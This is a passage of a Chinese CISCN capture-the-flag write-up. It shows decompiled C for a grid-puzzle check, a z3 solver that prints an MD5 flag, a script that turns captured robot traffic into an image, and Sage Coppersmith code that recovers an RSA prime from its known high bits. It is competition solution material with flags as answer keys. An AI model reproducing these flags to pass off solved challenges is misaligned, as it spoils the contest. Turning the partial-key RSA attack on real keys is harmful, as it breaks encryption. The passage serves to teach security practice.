class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v5] &lt; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v5 + <span class="hljs-number">1</span>] )<br>            <span class="hljs-keyword">goto</span> LABEL_27;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( row[<span class="hljs-number">4</span> * v5] == <span class="hljs-number">2</span> &amp;&amp; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v5] &gt; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v5 + <span class="hljs-number">1</span>] )<br>        &#123;<br>LABEL_27:<br>          v8 = <span class="hljs-number">0</span>;<br>          <span class="hljs-keyword">return</span> v8 &amp; <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ( byte_405071[<span class="hljs-number">4</span> * v5] == <span class="hljs-number">1</span> )<br>        &#123;<br>          <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v5 + <span class="hljs-number">1</span>] &lt; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v5 + <span class="hljs-number">2</span>] )<br>            <span class="hljs-keyword">goto</span> LABEL_27;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( byte_405071[<span class="hljs-number">4</span> * v5] == <span class="hljs-number">2</span> &amp;&amp; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v5 + <span class="hljs-number">1</span>] &gt; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v5 + <span class="hljs-number">2</span>] )<br>        &#123;<br>          <span class="hljs-keyword">goto</span> LABEL_27;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ( byte_405072[<span class="hljs-number">4</span> * v5] == <span class="hljs-number">1</span> )<br>        &#123;<br>          <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v5 + <span class="hljs-number">2</span>] &lt; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v5 + <span class="hljs-number">3</span>] )<br>            <span class="hljs-keyword">goto</span> LABEL_27;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( byte_405072[<span class="hljs-number">4</span> * v5] == <span class="hljs-number">2</span> &amp;&amp; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v5 + <span class="hljs-number">2</span>] &gt; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v5 + <span class="hljs-number">3</span>] )<br>        &#123;<br>          <span class="hljs-keyword">goto</span> LABEL_27;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ( byte_405073[<span class="hljs-number">4</span> * v5] == <span class="hljs-number">1</span> )<br>        &#123;<br>          <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v5 + <span class="hljs-number">3</span>] &lt; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v5 + <span class="hljs-number">4</span>] )<br>            <span class="hljs-keyword">goto</span> LABEL_27;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( byte_405073[<span class="hljs-number">4</span> * v5] == <span class="hljs-number">2</span> &amp;&amp; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v5 + <span class="hljs-number">3</span>] &gt; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v5 + <span class="hljs-number">4</span>] )<br>        &#123;<br>          <span class="hljs-keyword">goto</span> LABEL_27;<br>        &#125;<br>        ++v5;<br>        <span class="hljs-keyword">if</span> ( v4 + <span class="hljs-number">1</span> &gt;= <span class="hljs-number">5</span> )<br>        &#123;<br>          v3 = <span class="hljs-number">0LL</span>;<br>          <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>          &#123;<br>            v2 = v3 + <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> ( col[<span class="hljs-number">5</span> * v3] == <span class="hljs-number">1</span> )<br>            &#123;<br>              v1 = <span class="hljs-number">0</span>;<br>              <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v3] &gt; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v2] )<br>                <span class="hljs-keyword">goto</span> LABEL_26;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( col[<span class="hljs-number">5</span> * v3] == <span class="hljs-number">2</span> )<br>            &#123;<br>              v1 = <span class="hljs-number">0</span>;<br>              <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v3] &lt; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v2] )<br>              &#123;<br>LABEL_26:<br>                v8 = v1;<br>                <span class="hljs-keyword">return</span> v8 &amp; <span class="hljs-number">1</span>;<br>              &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> ( byte_405091[<span class="hljs-number">5</span> * v3] == <span class="hljs-number">1</span> )<br>            &#123;<br>              v1 = <span class="hljs-number">0</span>;<br>              <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v3 + <span class="hljs-number">1</span>] &gt; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v2 + <span class="hljs-number">1</span>] )<br>                <span class="hljs-keyword">goto</span> LABEL_26;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( byte_405091[<span class="hljs-number">5</span> * v3] == <span class="hljs-number">2</span> )<br>            &#123;<br>              v1 = <span class="hljs-number">0</span>;<br>              <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v3 + <span class="hljs-number">1</span>] &lt; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v2 + <span class="hljs-number">1</span>] )<br>                <span class="hljs-keyword">goto</span> LABEL_26;<br>            &#125;<br>            <span class="hljs-keyword">if</span> ( byte_405092[<span class="hljs-number">5</span> * v3] == <span class="hljs-number">1</span> )<br>            &#123;<br>              v1 = <span class="hljs-number">0</span>;<br>              <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v3 + <span class="hljs-number">2</span>] &gt; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v2 + <span class="hljs-number">2</span>] )<br>                <span class="hljs-keyword">goto</span> LABEL_26;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( byte_405092[<span class="hljs-number">5</span> * v3] == <span class="hljs-number">2</span> )<br>            &#123;<br>              v1 = <span class="hljs-number">0</span>;<br>              <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v3 + <span class="hljs-number">2</span>] &lt; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v2 + <span class="hljs-number">2</span>] )<br>                <span class="hljs-keyword">goto</span> LABEL_26;<br>            &#125;<br>            <span class="hljs-keyword">if</span> ( byte_405093[<span class="hljs-number">5</span> * v3] == <span class="hljs-number">1</span> )<br>            &#123;<br>              v1 = <span class="hljs-number">0</span>;<br>              <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v3 + <span class="hljs-number">3</span>] &gt; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v2 + <span class="hljs-number">3</span>] )<br>                <span class="hljs-keyword">goto</span> LABEL_26;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( byte_405093[<span class="hljs-number">5</span> * v3] == <span class="hljs-number">2</span> )<br>            &#123;<br>              v1 = <span class="hljs-number">0</span>;<br>              <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v3 + <span class="hljs-number">3</span>] &lt; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v2 + <span class="hljs-number">3</span>] )<br>                <span class="hljs-keyword">goto</span> LABEL_26;<br>            &#125;<br>            <span class="hljs-keyword">if</span> ( byte_405094[<span class="hljs-number">5</span> * v3] == <span class="hljs-number">1</span> )<br>            &#123;<br>              v1 = <span class="hljs-number">0</span>;<br>              <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v3 + <span class="hljs-number">4</span>] &gt; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v2 + <span class="hljs-number">4</span>] )<br>                <span class="hljs-keyword">goto</span> LABEL_26;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( byte_405094[<span class="hljs-number">5</span> * v3] == <span class="hljs-number">2</span> )<br>            &#123;<br>              v1 = <span class="hljs-number">0</span>;<br>              <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v3 + <span class="hljs-number">4</span>] &lt; (<span class="hljs-type">unsigned</span> __int8)<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * v2 + <span class="hljs-number">4</span>] )<br>                <span class="hljs-keyword">goto</span> LABEL_26;<br>            &#125;<br>            ++v3;<br>            v1 = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> ( v2 &gt;= <span class="hljs-number">4</span> )<br>              <span class="hljs-keyword">goto</span> LABEL_26;<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>  v8 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> v8 &amp; <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>这里值得说的就是这个使用goto LABEL实现的(个人认为是)for循环的if结构的语句，按照程序逻辑是一个求多元方程的过程，所以选择了python的z3库来解决，根据前面分析的逻辑逆向求解即可。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><br>zy=[<span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>,<span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>,<span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>]<br>sx=[<span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>,<span class="hljs-number">0x02</span>,<span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>]<br>ts = Solver()<br><span class="hljs-built_in">map</span> = [BitVec(<span class="hljs-string">&#x27;s%d&#x27;</span> % i, <span class="hljs-number">4</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">25</span>)]<br>ts.add(<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span>*<span class="hljs-number">2</span>+<span class="hljs-number">2</span>] == <span class="hljs-number">4</span>)<br>ts.add(<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span>*<span class="hljs-number">3</span>+<span class="hljs-number">3</span>] == <span class="hljs-number">3</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">map</span>:<br>    ts.add(i &gt; <span class="hljs-number">0</span>)<br>    ts.add(i &lt;= <span class="hljs-number">5</span>)<br><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    ts.add(<br>    And(<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + <span class="hljs-number">1</span>],<br>        <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + <span class="hljs-number">2</span>],<br>        <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + <span class="hljs-number">3</span>],<br>        <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + <span class="hljs-number">4</span>],<br>        <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + <span class="hljs-number">1</span>] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + <span class="hljs-number">2</span>],<br>        <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + <span class="hljs-number">1</span>] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + <span class="hljs-number">3</span>],<br>        <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + <span class="hljs-number">1</span>] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + <span class="hljs-number">4</span>],<br>        <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + <span class="hljs-number">2</span>] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + <span class="hljs-number">3</span>],<br>        <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + <span class="hljs-number">2</span>] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + <span class="hljs-number">4</span>],<br>        <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + <span class="hljs-number">3</span>] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + <span class="hljs-number">4</span>]))<br><span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    ts.add(<br>    And(<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">0</span> + b] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">1</span> + b],<br>        <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">0</span> + b] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">2</span> + b],<br>        <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">0</span> + b] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">3</span> + b],<br>        <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">0</span> + b] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">4</span> + b],<br>        <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">1</span> + b] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">2</span> + b],<br>        <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">1</span> + b] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">3</span> + b],<br>        <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">1</span> + b] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">4</span> + b],<br>        <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">2</span> + b] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">3</span> + b],<br>        <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">2</span> + b] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">4</span> + b],<br>        <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">3</span> + b] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * <span class="hljs-number">4</span> + b]<br>        ))<br><span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br> <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>        ts.add(<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * b + y] != <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * (b + <span class="hljs-number">1</span>) + y])<br><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    <span class="hljs-keyword">if</span> zy[<span class="hljs-number">4</span> * a + x]==<span class="hljs-number">1</span>:<br>        ts.add(<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + x] &gt; <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + x + <span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">elif</span> zy[<span class="hljs-number">4</span> * a + x] == <span class="hljs-number">2</span>:<br>        ts.add(<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + x] &lt; <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * a + x + <span class="hljs-number">1</span>])<br><span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br> <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    <span class="hljs-keyword">if</span> sx[<span class="hljs-number">5</span> * b + y]==<span class="hljs-number">1</span>:<br>        ts.add(<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * b + y] &lt; <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * (b + <span class="hljs-number">1</span>) + y])<br>    <span class="hljs-keyword">elif</span> sx[<span class="hljs-number">5</span> * b + y] == <span class="hljs-number">2</span> :<br>        ts.add(<span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * b + y] &gt; <span class="hljs-built_in">map</span>[<span class="hljs-number">5</span> * (b + <span class="hljs-number">1</span>) + y])<br><span class="hljs-built_in">print</span>()<br><span class="hljs-keyword">while</span> ts.check() == sat:<br>    answer = ts.model()<br>    condition = []<br>    p = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">map</span>:<br>        p += [answer[i]]<br>        condition.append(i != answer[i])<br>    p[<span class="hljs-number">5</span> * <span class="hljs-number">2</span> + <span class="hljs-number">2</span>] = <span class="hljs-number">0</span><br>    p[<span class="hljs-number">5</span> * <span class="hljs-number">3</span> + <span class="hljs-number">3</span>] = <span class="hljs-number">0</span><br>    ts.add(Or(condition))<br><br>p=[<span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>]<br>l=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> p:<br>    l+=<span class="hljs-built_in">str</span>(i)<br>md = hashlib.md5()<br>md.update(l.encode())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;CISCN&#123;&#x27;</span>+md.hexdigest()+<span class="hljs-string">&#x27;&#125;&#x27;</span>)<br></code></pre></td></tr></table></figure>
+<h2 id="第三卷"><a href="#第三卷" class="headerlink" title="第三卷"></a>第三卷</h2><h3 id="MISC-2"><a href="#MISC-2" class="headerlink" title="MISC"></a>MISC</h3><h4 id="robot"><a href="#robot" class="headerlink" title="robot"></a>robot</h4><p>下载后发现rspag文件是robotstdio的仿真文件，在WireShark中看看流量，注意到部分流量中出现了<code>Value[193, 65, 0]</code>,这个<code>Value</code>属性内的数据根据题目给的提示很有可能就是整个题目的破题点。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>a = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;Value\.\[(\d+),(\d+),(\d+)\]&#x27;</span>)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.read()<br>    data1 = a.findall(data)<br><br><span class="hljs-built_in">print</span>(data1)<br><br>img = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>, (<span class="hljs-number">456</span>, <span class="hljs-number">456</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data1:<br>    tmp = (<span class="hljs-built_in">int</span>(i[<span class="hljs-number">0</span>]), <span class="hljs-built_in">int</span>(i[<span class="hljs-number">1</span>]))<br>    img.putpixel(tmp, <span class="hljs-number">255</span>)<br>img.save(<span class="hljs-string">&quot;b.png&quot;</span>)<br></code></pre></td></tr></table></figure>
+<p>得到flag<code>easy_robo_xx</code>，对其进行md5加密之后得到解<code>CISCN&#123;d4f1fb80bc11ffd722861367747c0f10&#125;</code></p>
+<h3 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h3><h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><p>计算p和q</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">n = <span class="hljs-number">0xa188aaaf75c79219462f0ba90b68cb6e0694b113c89b8006f3a54f6374bbc0d91fb83b15866d93fd74019e1e541edce6c06c012c76f41af516f5cc89f5f9984f4e626607632edec7139e5acc4a3f3f0dd90665d469fcf7c9226fb0fe275b6b2a776dac8d032c880eec9862fc9d6480fb9cd2ce3e65867eac7e52d4462fb501eb</span><br><br>p = <span class="hljs-number">0xda5f14bacd97f5504f39eeef22af37e8551700296843e536760cea761d334508003e01b886c0c600000000000000000000000000000000000000000000000000</span><br>k = <span class="hljs-number">200</span><br>PR.&lt;x&gt; = PolynomialRing(Zmod(n))<br>s = x + p<br>x0 = s.small_roots(X=<span class="hljs-number">2</span>^k, beta=<span class="hljs-number">0.4</span>)[<span class="hljs-number">0</span>]<br>p = p+x0<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;p:    &quot;</span>, <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(p)))<br>q = n/<span class="hljs-built_in">int</span>(p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;q:    &quot;</span>, <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(q)))<br></code></pre></td></tr></table></figure>
+
+<p>解密msg</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td 